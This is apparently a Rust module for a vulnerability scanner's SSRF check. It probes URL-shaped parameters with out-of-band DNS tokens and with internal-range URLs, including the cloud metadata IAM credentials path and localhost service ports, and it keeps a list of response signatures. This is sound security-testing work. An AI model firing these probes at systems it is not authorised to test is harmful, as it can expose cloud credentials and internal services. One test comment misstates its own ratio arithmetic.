//! Server-Side Request Forgery (SSRF) active scan check.
//!
//! SSRF is unlike `sqli.rs`/`xss.rs`/`traversal.rs` in one important way:
//! a *successful* exploit often produces no signal at all in the HTTP
//! response the scanner sees — the interesting thing happened on a request
//! the *target* made to somewhere else entirely. So this check runs two
//! independent phases per URL-shaped parameter:
//!
//!   1. **OOB confirmation** (ground truth, when available). Substitute an
//!      [`crate::oob`] token URL as the parameter value. If the target
//!      later resolves that token's subdomain, the server definitely made
//!      an outbound request driven by our input — about as close to proof
//!      as blind SSRF detection gets. `Severity::Critical`.
//!   2. **Response-diff heuristic** (works even with no OOB domain
//!      configured, e.g. the target's egress firewall blocks arbitrary
//!      DNS/HTTP but the app still fetches internal-only URLs). Substitute
//!      a handful of well-known internal-range URLs (cloud metadata
//!      endpoint, localhost + common ports) and compare each response
//!      against a baseline built from a syntactically similar but
//!      guaranteed-unreachable URL. A meaningfully different response
//!      (different status, a cloud-metadata signature, or a large body-size
//!      delta) suggests the request actually reached something — but
//!      unlike phase 1, this is inference from response shape, not a
//!      confirmed outbound request, hence the lower `Severity::Medium`.
//!
//! Both phases run for every URL-shaped parameter; a target can produce a
//! `Critical` finding from phase 1, a `Medium` finding from phase 2, both,
//! or neither.

use std::time::Duration;

use async_trait::async_trait;
use reqwest::Client;

use crate::logger;
use crate::oob::OobChannel;
use crate::scanner::{ScanCheck, ScanFinding, ScanTarget, Severity};

/// Delay enforced between consecutive phase-2 (response-diff) probes
/// against a target. Mirrors `sqli.rs::PROBE_DELAY`. Phase 1 doesn't need
/// this separately — the OOB wait (`OOB_SHORT_DELAY` + `was_triggered`'s
/// own timeout) already spaces those probes out far more than this.
const PROBE_DELAY: Duration = Duration::from_millis(300);

/// How long to wait, after sending an OOB probe, before starting to poll
/// for a DNS hit — gives a slow target's outbound request time to actually
/// leave the building before we start asking "did it show up yet".
const OOB_SHORT_DELAY: Duration = Duration::from_millis(500);

/// Total time budget given to `OobChannel::was_triggered` per parameter,
/// on top of `OOB_SHORT_DELAY`. Generous relative to typical DNS resolution
/// latency, but still bounded so one scan doesn't stall indefinitely on an
/// unreachable OOB domain.
const OOB_WAIT_TIMEOUT: Duration = Duration::from_secs(8);

/// A syntactically valid but guaranteed-unreachable URL (`.invalid` is
/// reserved for exactly this purpose by RFC 2606), substituted as the
/// "nothing special happened" baseline for the phase-2 heuristic.
const BASELINE_INVALID_URL: &str = "http://cogitator-ssrf-baseline-9f3a1c.invalid/";

/// Internal-range URLs tried in phase 2. Covers the single most
/// consequential SSRF target (cloud instance metadata, both the plain
/// endpoint and the IAM credentials path AWS/GCP-style metadata services
/// expose under it) plus a spread of common localhost service ports.
const INTERNAL_CANDIDATE_URLS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:8080/",
    "http://localhost/",
];

/// Response-body substrings that, if present in a phase-2 candidate
/// response, are treated as an outright "reached something internal" hit
/// regardless of how similar the body length is to baseline. Covers the
/// major cloud metadata services plus a couple of common localhost service
/// banners.
const METADATA_SIGNATURES: &[&str] = &[
    "ami-id",
    "instance-id",
    "iam/security-credentials",
    "computeMetadata",
    "Metadata-Flavor",
    "root:x:", // a localhost file-serving misconfig, not metadata per se, but equally "reached something it shouldn't"
];

/// Minimum absolute character-count delta between baseline and candidate
/// bodies before the ratio check even applies — guards against flagging on
/// trivially small responses (e.g. a 3-byte baseline vs 5-byte candidate is
/// a 40%+ ratio but not meaningful evidence of anything).
const MIN_ABSOLUTE_LENGTH_DIFF: usize = 40;

/// Fraction of the longer body's length the length delta must reach (once
/// past the absolute floor above) to count as "meaningfully different".
const LENGTH_DIFF_RATIO_THRESHOLD: f64 = 0.25;

/// Parameter-name substrings that commonly indicate a URL-consuming field
/// even when the current value isn't itself a URL (e.g. an empty or
/// placeholder value in a recorded request). Checked case-insensitively.
const URL_PARAM_NAME_HINTS: &[&str] = &[
    "url", "uri", "callback", "webhook", "redirect", "next", "dest",
    "target", "endpoint", "fetch", "src", "link", "path", "return",
    "image", "avatar", "feed", "proxy",
];

pub struct SsrfCheck {
    /// `None` when no OOB domain is configured (`config::OOB_DOMAIN` empty,
    /// or the listener failed to bind) — phase 1 is then simply skipped and
    /// only the response-diff heuristic (phase 2) runs.
    oob: Option<OobChannel>,
}

impl SsrfCheck {
    /// `oob`, when present, must be a channel bound to a domain the
    /// operator controls — see `crate::oob`'s module docs. Pass `None` to
    /// run this check with only the OOB-independent response-diff
    /// heuristic (phase 2); phase 1 (OOB confirmation) is skipped entirely
    /// in that case.
    pub fn new(oob: Option<OobChannel>) -> Self {
        Self { oob }
    }

    /// `true` if `value` is already a URL, or `name` looks like a
    /// parameter that's meant to hold one.
    fn is_url_shaped(name: &str, value: &str) -> bool {
        let v = value.trim();
        if v.starts_with("http://") || v.starts_with("https://") {
            return true;
        }
        let lname = name.to_lowercase();
        URL_PARAM_NAME_HINTS.iter().any(|hint| lname.contains(hint))
    }

    /// Core phase-2 decision, factored out so it can be unit-tested with
    /// fabricated body lengths/status codes instead of driving it through
    /// real HTTP probes.
    fn is_meaningfully_different(
        baseline_status: Option<u16>,
        baseline_len: usize,
        candidate_status: Option<u16>,
        candidate_len: usize,
        candidate_has_metadata_signature: bool,
    ) -> bool {
        if candidate_has_metadata_signature {
            return true;
        }
        if baseline_status != candidate_status {
            return true;
        }

        let longer = baseline_len.max(candidate_len);
        if longer == 0 {
            return false;
        }
        let diff = longer - baseline_len.min(candidate_len);
        if diff < MIN_ABSOLUTE_LENGTH_DIFF {
            return false;
        }
        (diff as f64 / longer as f64) >= LENGTH_DIFF_RATIO_THRESHOLD
    }

    /// Build a request for `target` with `param_name` replaced by `value`
    /// (all other params left at their original value), send it, and
    /// return `(request_raw, status, body)`. Network/parse failures yield
    /// `None` so the caller can simply skip this probe, mirroring
    /// `sqli.rs::probe`.
    async fn probe(
        client: &Client,
        target: &ScanTarget,
        param_name: &str,
        value: &str,
    ) -> Option<(String, Option<u16>, String)> {
        let substituted_params: Vec<(String, String)> = target
            .params
            .iter()
            .map(|(k, v)| {
                if k == param_name {
                    (k.clone(), value.to_string())
                } else {
                    (k.clone(), v.clone())
                }
            })
            .collect();

        let method = target.method.to_uppercase();
        let mut req = client.request(
            method.parse().unwrap_or(reqwest::Method::GET),
            &target.url,
        );

        for (k, v) in &target.headers {
            req = req.header(k.as_str(), v.as_str());
        }

        req = if method == "GET" || method == "HEAD" {
            req.query(&substituted_params)
        } else {
            req.form(&substituted_params)
        };

        let request_raw = format!(
            "{} {} param={} value={}",
            method, target.url, param_name, value
        );

        match req.send().await {
            Ok(resp) => {
                let status = Some(resp.status().as_u16());
                match resp.text().await {
                    Ok(body) => Some((request_raw, status, body)),
                    Err(e) => {
                        logger::debug(&format!("ssrf check: failed to read response body: {e}"));
                        None
                    }
                }
            }
            Err(e) => {
                logger::debug(&format!("ssrf check: request failed: {e}"));
                None
            }
        }
    }
}

#[async_trait]
impl ScanCheck for SsrfCheck {
    fn name(&self) -> &str {
        "Server-Side Request Forgery"
    }

    async fn check(&self, client: &Client, target: &ScanTarget) -> Vec<ScanFinding> {
        let mut findings = Vec::new();

        let url_params: Vec<String> = target
            .params
            .iter()
            .filter(|(k, v)| Self::is_url_shaped(k, v))
            .map(|(k, _)| k.clone())
            .collect();

        if url_params.is_empty() {
            return findings;
        }

        // ── Phase 1: OOB confirmation (skipped entirely if no OOB domain
        // is configured) ───────────────────────────────────────────────────
        if let Some(oob) = &self.oob {
            for param_name in &url_params {
                let token = oob.new_token();
                let payload_url = format!("http://{}/", oob.full_domain(&token));

                let Some((request_raw, _status, _body)) =
                    Self::probe(client, target, param_name, &payload_url).await
                else {
                    continue;
                };

                tokio::time::sleep(OOB_SHORT_DELAY).await;

                if oob.was_triggered(&token, OOB_WAIT_TIMEOUT).await {
                    logger::warn(&format!(
                        "ssrf check: OOB interaction confirmed on param '{}' (token {})",
                        param_name, token
                    ));

                    findings.push(ScanFinding {
                        check_name: format!("{} (OOB confirmed)", self.name()),
                        severity: Severity::Critical,
                        evidence: format!(
                            "target resolved OOB token subdomain '{}' — confirms the server made an \
                             outbound request to attacker-controlled infrastructure",
                            oob.full_domain(&token)
                        ),
                        request_raw,
                        response_snippet: String::new(),
                        url: target.url.clone(),
                        parameter: Some(param_name.clone()),
                    });
                }
            }
        }

        // ── Phase 2: OOB-independent response-diff heuristic ─────────────
        let mut first_probe = true;

        for param_name in &url_params {
            if !first_probe {
                tokio::time::sleep(PROBE_DELAY).await;
            }
            first_probe = false;

            let Some((_, baseline_status, baseline_body)) =
                Self::probe(client, target, param_name, BASELINE_INVALID_URL).await
            else {
                continue;
            };
            let baseline_len = baseline_body.chars().count();

            for candidate in INTERNAL_CANDIDATE_URLS {
                tokio::time::sleep(PROBE_DELAY).await;

                let Some((request_raw, candidate_status, candidate_body)) =
                    Self::probe(client, target, param_name, candidate).await
                else {
                    continue;
                };

                let has_signature = METADATA_SIGNATURES
                    .iter()
                    .any(|sig| candidate_body.contains(sig));
                let candidate_len = candidate_body.chars().count();

                if Self::is_meaningfully_different(
                    baseline_status,
                    baseline_len,
                    candidate_status,
                    candidate_len,
                    has_signature,
                ) {
                    logger::warn(&format!(
                        "ssrf check: response diverges from baseline for param '{}' against internal URL '{}'",
                        param_name, candidate
                    ));

                    findings.push(ScanFinding {
                        check_name: format!("{} (response-diff heuristic)", self.name()),
                        severity: Severity::Medium,
                        evidence: format!(
                            "baseline (unreachable URL) body {} chars vs internal-range URL '{}' body {} chars{}",
                            baseline_len,
                            candidate,
                            candidate_len,
                            if has_signature { " — matched a cloud metadata / internal-service signature" } else { "" }
                        ),
                        request_raw,
                        response_snippet: candidate_body.chars().take(200).collect(),
                        url: target.url.clone(),
                        parameter: Some(param_name.clone()),
                    });

                    // One confirmed finding per parameter is enough signal;
                    // move to the next parameter rather than burning
                    // through the remaining candidate URLs against it.
                    break;
                }
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── is_url_shaped ──────────────────────────────────────────────────────

    #[test]
    fn value_starting_with_http_scheme_is_url_shaped() {
        assert!(SsrfCheck::is_url_shaped("data", "http://example.com/thing"));
        assert!(SsrfCheck::is_url_shaped("data", "https://example.com/thing"));
    }

    #[test]
    fn param_name_hint_matches_even_with_non_url_value() {
        assert!(SsrfCheck::is_url_shaped("callback_url", ""));
        assert!(SsrfCheck::is_url_shaped("redirectTo", "/home"));
        assert!(SsrfCheck::is_url_shaped("webhook", "placeholder"));
    }

    #[test]
    fn unrelated_param_and_value_is_not_url_shaped() {
        assert!(!SsrfCheck::is_url_shaped("username", "johny"));
        assert!(!SsrfCheck::is_url_shaped("page", "3"));
    }

    // ── is_meaningfully_different ──────────────────────────────────────────

    #[test]
    fn identical_status_and_length_is_not_different() {
        assert!(!SsrfCheck::is_meaningfully_different(Some(400), 120, Some(400), 120, false));
    }

    #[test]
    fn differing_status_code_is_always_different() {
        assert!(SsrfCheck::is_meaningfully_different(Some(400), 120, Some(200), 120, false));
    }

    #[test]
    fn metadata_signature_overrides_similar_length() {
        // Same status, near-identical length — but a metadata signature
        // was found, which should short-circuit straight to "different".
        assert!(SsrfCheck::is_meaningfully_different(Some(200), 100, Some(200), 102, true));
    }

    #[test]
    fn small_absolute_diff_below_floor_is_ignored_even_with_high_ratio() {
        // 3 chars vs 5 chars is a 40% ratio but only a 2-char absolute
        // delta — exactly the trivial-response case MIN_ABSOLUTE_LENGTH_DIFF
        // guards against.
        assert!(!SsrfCheck::is_meaningfully_different(Some(200), 3, Some(200), 5, false));
    }

    #[test]
    fn large_absolute_and_ratio_diff_is_flagged() {
        assert!(SsrfCheck::is_meaningfully_different(Some(200), 100, Some(200), 500, false));
    }

    #[test]
    fn large_absolute_but_small_ratio_diff_is_ignored() {
        // Both bodies are large; a 40-char delta relative to a 10,000-char
        // baseline is well under the 25% ratio threshold.
        assert!(!SsrfCheck::is_meaningfully_different(Some(200), 10_000, Some(200), 10_040, false));
    }

    #[test]
    fn both_bodies_empty_is_not_different() {
        assert!(!SsrfCheck::is_meaningfully_different(Some(200), 0, Some(200), 0, false));
    }

    #[test]
    fn boundary_exactly_at_ratio_threshold_is_flagged() {
        // 25 vs 100 -> diff 75, longer 100, ratio exactly 0.25 -> inclusive `>=`.
        assert!(SsrfCheck::is_meaningfully_different(Some(200), 25, Some(200), 100, false));
    }
}